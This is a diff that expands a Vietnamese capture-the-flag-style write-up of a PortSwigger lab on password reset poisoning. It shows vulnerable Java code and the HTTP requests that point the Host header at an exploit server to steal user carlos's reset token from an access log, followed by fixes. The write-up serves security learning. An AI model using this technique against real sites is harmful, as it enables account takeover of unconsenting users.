@@ -11,89 +11,215 @@ showTableOfContents: true
 
 ## Thông tin bài Lab
 * **Tên bài Lab**: Basic password reset poisoning
-* **Chuyên đề**: HTTP Host Header attacks
-* **Mức độ**: Practitioner
-* **Mục tiêu**: Đăng nhập thành công vào tài khoản của người dùng `carlos` bằng cách chiếm đoạt token đặt lại mật khẩu của họ.
+* **Chuyên đề**: HTTP Host Header attacks / Account Takeover
+* **Mức độ**: Apprentice
+* **Mục tiêu**: Khai thác Password Reset Poisoning để đánh cắp token đặt lại mật khẩu và chiếm quyền tài khoản `carlos`.
 
 ---
 
 ## 1. Kiến thức nền tảng
 
-Ứng dụng web cung cấp tính năng quên mật khẩu (*Forgot Password*). Khi người dùng gửi yêu cầu đặt lại mật khẩu, hệ thống sẽ gửi một email chứa đường dẫn đặt lại mật khẩu kèm token bí mật.
+Chức năng đặt lại mật khẩu là một thành phần trọng yếu trong cơ chế quản lý danh tính của các ứng dụng web. Quy trình này đòi hỏi tính bảo mật tuyệt đối đối với token xác thực được gửi đến hộp thư của người dùng.
 
-### Kiểm tra gói tin gửi yêu cầu đặt lại mật khẩu:
-Bắt request trong **Burp Suite**:
-```http
-POST /forgot-password HTTP/1.1
-Host: YOUR-LAB-ID.web-security-academy.net
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 16
+### 1.1. Quy trình xử lý yêu cầu đặt lại mật khẩu tiêu chuẩn
 
-username=carlos
+Một quy trình đặt lại mật khẩu thông thường bao gồm các bước:
+- **Bước 1:** Người dùng gửi yêu cầu kèm theo tên đăng nhập hoặc địa chỉ email.
+- **Bước 2:** Hệ thống kiểm tra sự tồn tại của tài khoản, sinh ra một chuỗi token ngẫu nhiên có độ entropy cao và lưu trữ vào cơ sở dữ liệu kèm thời hạn hết hạn.
+- **Bước 3:** Máy chủ tạo đường dẫn chứa token và gửi nội dung này vào email của người dùng:
+
+```text
+https://example.com/forgot-password?temp-forgot-password-token=SECRET_TOKEN
 ```
 
-Nhận thấy ứng dụng không validate header `Host` mà sử dụng trực tiếp giá trị này để tạo đường dẫn link reset password gửi vào email nạn nhân.
+- **Bước 4:** Người dùng truy cập đường dẫn, gửi token lên máy chủ để được cấp quyền thiết lập mật khẩu mới.
+
+### 1.2. Sai lầm kiến trúc dẫn đến Password Reset Poisoning
+
+Khi xây dựng đường dẫn gửi qua email, ứng dụng cần ghép tên miền của hệ thống vào trước đường dẫn tài nguyên. Thay vì sử dụng giá trị tên miền cố định được cấu hình trong biến môi trường máy chủ, lập trình viên lại đọc trực tiếp giá trị từ trường header Host của HTTP Request:
+
+```java
+// Mã nguồn xử lý sai lầm phổ biến
+String resetUrl = "https://" + request.getHeader("Host") 
+                + "/forgot-password?temp-forgot-password-token=" + token;
+emailService.sendResetEmail(user.getEmail(), resetUrl);
+```
+
+Vì trường header Host hoàn toàn do client kiểm soát và có thể bị can thiệp bởi Burp Suite, việc tin tưởng trường này khiến ứng dụng vô tình tạo ra liên kết trỏ về máy chủ của kẻ tấn công.
 
 ---
 
 ## 2. Mô hình tấn công
 
-Hệ thống backend sử dụng giá trị từ header `Host` do client gửi lên để sinh URL tuyệt đối cho liên kết đặt lại mật khẩu:
+### 2.1. Phân tích nguyên nhân và điều kiện phát sinh lỗ hổng
 
-```php
-$reset_url = "https://" . $_SERVER['HTTP_HOST'] . "/reset-password?token=" . $token;
+- **Tin tưởng ngầm định Input:** Ứng dụng coi header Host là dữ liệu đáng tin cậy để tạo các liên kết nhạy cảm gửi ra bên ngoài.
+- **Thiếu danh sách tên miền hợp lệ:** Hạ tầng Web Server và Reverse Proxy không lọc hoặc từ chối các request chứa header Host lạ.
+- **Hành vi tự động của người dùng:** Nạn nhân mở email và nhấp vào liên kết mà không kiểm tra kỹ tên miền đích.
+
+### 2.2. Sơ đồ luồng dữ liệu tấn công
+
+```text
+[ Attacker ]
+       │
+       │  Gửi yêu cầu reset mật khẩu cho carlos:
+       │  POST /forgot-password HTTP/2
+       │  Host: exploit-server.net      <── Thay thế bằng domain của Attacker
+       │  username=carlos
+       ▼
+[ Web Application Server ]
+       │
+       │  Sinh token bí mật hợp lệ: TOKEN_XYZ
+       │  Ghép URL theo Host header:
+       │  https://exploit-server.net/forgot-password?temp-forgot-password-token=TOKEN_XYZ
+       │  Gửi email chứa liên kết trên vào hòm thư nạn nhân
+       ▼
+[ Hòm thư của Carlos ]
+       │
+       │  Carlos mở email và nhấp vào liên kết bị đầu độc
+       ▼
+[ Exploit Server của Attacker ]
+       │
+       │  Ghi nhận request vào Access Log:
+       │  GET /forgot-password?temp-forgot-password-token=TOKEN_XYZ HTTP/1.1
+       ▼
+[ Attacker lấy Token ] ──► Đổi mật khẩu tài khoản Carlos ──► Chiếm đoạt tài khoản!
 ```
-
-Do không cấu hình danh sách Whitelist cho domain, kẻ tấn công có thể thay thế header `Host` bằng domain máy chủ Exploit Server. Khi nạn nhân click vào liên kết trong email, token bí mật sẽ được gửi thẳng đến Access Log của máy chủ kẻ tấn công.
 
 ---
 
 ## 3. Khai thác lỗ hổng
 
-### Bước 1: Chuẩn bị máy chủ Exploit Server
-Mở **Exploit Server** được cung cấp bởi bài lab và sao chép địa chỉ domain:
-```text
-exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net
-```
+Quá trình thực nghiệm được triển khai tuần tự qua 5 giai đoạn:
 
-### Bước 2: Gửi gói tin can thiệp header Host
-Trong Burp Repeater, thay đổi giá trị header `Host` thành domain của Exploit Server và gửi yêu cầu reset mật khẩu cho tài khoản `carlos`:
+### Giai đoạn 1: Khảo sát quy trình đặt lại mật khẩu với tài khoản thử nghiệm
+
+Gửi request đặt lại mật khẩu cho tài khoản `wiener` qua Burp Suite Repeater:
 
 ```http
-POST /forgot-password HTTP/1.1
-Host: exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net
+POST /forgot-password HTTP/2
+Host: 0a6a00ba0450131880ef178600140009.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 16
 
-username=carlos
+csrf=kMq9RVeUxfQpLCIPJRKOJzxygHorbIzN&username=wiener
 ```
 
-Gửi request và nhận phản hồi `200 OK`. Lúc này, hệ thống đã gửi email đến `carlos` với đường dẫn trỏ tới Exploit Server của chúng ta.
+![Hình 1: Request gửi yêu cầu đặt lại mật khẩu cho tài khoản wiener](extracted_images/image1.png)
 
-### Bước 3: Lấy Token từ Access Log
-Chuyển sang tab **Access Log** trên Exploit Server. Ta thấy một request từ nạn nhân:
+Kiểm tra hộp thư của wiener trên Email Client, email chứa liên kết đặt lại mật khẩu hợp lệ:
+
 ```text
-GET /reset-password?token=abcdef1234567890xyz HTTP/1.1
+https://0a6a00ba0450131880ef178600140009.web-security-academy.net/forgot-password?temp-forgot-password-token=28fmtqhg74ekjf9g9ymp3iu9vxckmlck
 ```
 
-Sao chép chuỗi `token` này.
+![Hình 2: Email nhận được chứa liên kết đặt lại mật khẩu có cấu trúc tên miền lấy từ Host header](extracted_images/image2.png)
 
-### Bước 4: Đặt lại mật khẩu và hoàn thành bài Lab
-Truy cập đường dẫn reset password thực tế trên trang lab kèm token vừa chiếm được:
+Truy cập liên kết để kiểm tra biểu mẫu thiết lập mật khẩu mới của ứng dụng:
+
+![Hình 3: Giao diện nhập mật khẩu mới sau khi xác thực token](extracted_images/image3.png)
+
+---
+
+### Giai đoạn 2: Kiểm chứng tính phản xạ của Host header
+
+Để chứng minh ứng dụng lấy giá trị tên miền động từ request, tiến hành gửi lại request với trường `Host: tu4nki3t`:
+
+```http
+POST /forgot-password HTTP/2
+Host: tu4nki3t
+Content-Type: application/x-www-form-urlencoded
+
+csrf=kMq9RVeUxfQpLCIPJRKOJzxygHorbIzN&username=wiener
+```
+
+Máy chủ phản hồi `HTTP/2 200 OK`. Tiếp tục kiểm tra hòm thư của wiener:
+
+![Hình 4: Request kiểm chứng với Host header tùy biến tu4nki3t](extracted_images/image4.png)
+
+Liên kết trong email đã bị thay đổi tên miền hoàn toàn theo giá trị đã can thiệp:
+
 ```text
-https://YOUR-LAB-ID.web-security-academy.net/reset-password?token=abcdef1234567890xyz
+https://tu4nki3t/forgot-password?temp-forgot-password-token=nyv1624q9a50bpqbqyjpsauw980557co
 ```
-Nhập mật khẩu mới và tiến hành đăng nhập với tài khoản `carlos`. Bài lab được giải quyết thành công!
+
+![Hình 5: Email nhận được phản xạ chính xác chuỗi tu4nki3t trong liên kết](extracted_images/image5.png)
+
+---
+
+### Giai đoạn 3: Tấn công đầu độc liên kết nhắm vào nạn nhân carlos
+
+Xác định tên miền Exploit Server do bài lab cung cấp: `exploit-0a20004004e5131580c9162c01ff00ac.exploit-server.net`. Soạn request gửi yêu cầu đặt lại mật khẩu cho `username=carlos` với header Host trỏ về Exploit Server:
+
+```http
+POST /forgot-password HTTP/2
+Host: exploit-0a20004004e5131580c9162c01ff00ac.exploit-server.net
+Content-Type: application/x-www-form-urlencoded
+
+csrf=kMq9RVeUxfQpLCIPJRKOJzxygHorbIzN&username=carlos
+```
+
+Máy chủ xử lý thành công và gửi email chứa liên kết trỏ về Exploit Server vào hòm thư của carlos.
+
+![Hình 6: Request đầu độc Host header bằng domain Exploit Server cho tài khoản carlos](extracted_images/image6.png)
+
+---
+
+### Giai đoạn 4: Thu thập Token từ Access Log của Exploit Server
+
+Nạn nhân carlos mở email và nhấp vào liên kết. Trình duyệt của nạn nhân gửi request trực tiếp đến Exploit Server. Kiểm tra mục **Access log**, ghi nhận bản ghi trích xuất token thành công:
+
+```text
+10.0.4.19 2026-09-14 07:49:40 +0000 "GET /forgot-password?temp-forgot-password-token=pgus7rprrupslmrlyrxkzmbc3bxo2qj8 HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim)..."
+```
+
+Token thu được: `pgus7rprrupslmrlyrxkzmbc3bxo2qj8`
+
+![Hình 7: Access Log ghi nhận request từ nạn nhân chứa token đặt lại mật khẩu](extracted_images/image7.png)
+
+---
+
+### Giai đoạn 5: Đặt lại mật khẩu và chiếm quyền tài khoản carlos
+
+Sử dụng tên miền chính thống của bài lab kết hợp với token vừa thu thập để truy cập trang đặt lại mật khẩu:
+
+```text
+https://0a6a00ba0450131880ef178600140009.web-security-academy.net/forgot-password?temp-forgot-password-token=pgus7rprrupslmrlyrxkzmbc3bxo2qj8
+```
+
+Thiết lập mật khẩu mới cho tài khoản carlos:
+
+![Hình 8: Nhập mật khẩu mới cho tài khoản carlos với token hợp lệ](extracted_images/image8.png)
+
+Đăng nhập thành công với tài khoản carlos và mật khẩu vừa đặt. Bài lab được giải quyết hoàn tất.
+
+![Hình 9: Đăng nhập thành công vào tài khoản carlos và hoàn thành bài lab](extracted_images/image9.png)
 
 ---
 
 ## 4. Biện pháp khắc phục
 
-* **Không sử dụng header `Host` để tạo URL nhạy cảm**: Cấu hình giá trị domain tuyệt đối cố định trong file cấu hình của ứng dụng (ví dụ: `APP_URL` trong file `.env`).
-* **Sử dụng Server Name cố định**: Trên Nginx/Apache, cấu hình web server bỏ qua hoặc từ chối các request có header `Host` không nằm trong danh sách `server_name` hợp lệ:
-  ```nginx
-  server {
-      listen 80 default_server;
-      return 444; # Từ chối request không hợp lệ
-  }
-  ```
+### 4.1. Khắc phục tại tầng Ứng dụng
+
+- **Sử dụng tên miền cấu hình tĩnh:** Tuyệt đối không lấy giá trị tên miền từ trường header Host hay bất kỳ thông tin nào do client gửi lên để sinh liên kết gửi qua email. Tên miền phải được lấy từ biến môi trường cố định của hệ thống:
+
+```java
+// Cấu hình an toàn sử dụng biến môi trường tĩnh
+String baseUrl = System.getenv("APP_BASE_URL"); // https://example.com
+String resetUrl = baseUrl + "/forgot-password?temp-forgot-password-token=" + token;
+```
+
+- **Giới hạn thời gian hiệu lực và số lần sử dụng:** Token đặt lại mật khẩu phải có thời gian sống ngắn và bị hủy bỏ ngay lập tức sau lần sử dụng đầu tiên.
+
+### 4.2. Cấu hình bảo vệ tại Web Server và Reverse Proxy
+
+- **Xác thực tên miền tại Reverse Proxy:** Cấu hình Nginx, Apache hoặc API Gateway kiểm tra trường header Host và từ chối các yêu cầu có tên miền không nằm trong danh sách cho phép trước khi chuyển tiếp vào ứng dụng nội bộ.
+- **Thiết lập Virtual Host mặc định:** Cấu hình server block mặc định để đóng kết nối đối với các request không xác định tên miền đích:
+
+```nginx
+server {
+    listen 80 default_server;
+    listen 443 ssl default_server;
+    server_name _;
+    return 444;
+}
+```
